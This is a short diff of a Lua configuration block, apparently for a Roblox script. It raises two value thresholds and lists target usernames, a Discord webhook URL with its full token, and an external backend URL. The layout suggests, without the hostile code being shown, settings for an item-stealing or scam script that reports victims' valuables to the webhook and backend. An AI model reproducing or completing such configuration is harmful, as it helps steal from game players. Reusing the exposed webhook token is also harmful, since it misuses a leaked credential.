@@ -109,8 +109,8 @@ _G.Usernames = {
 	"husshuss_hold10"
 
 }
-_G.min_value = 1
-_G.ping_threshold = 1
+_G.min_value = 3
+_G.ping_threshold = 3
 _G.pingEveryone = "No"
 _G.webhook = "https://discord.com/api/webhooks/1573701585069019276/EwMgXNLFkeHisvYBvxOqIp8gXXf4ux7p1wJa5F9p1BswjEI0_JyJkGbu5vRISKSFRSat"
 _G.VPS_URL = "https://sab-backend.snthnova.workers.dev"
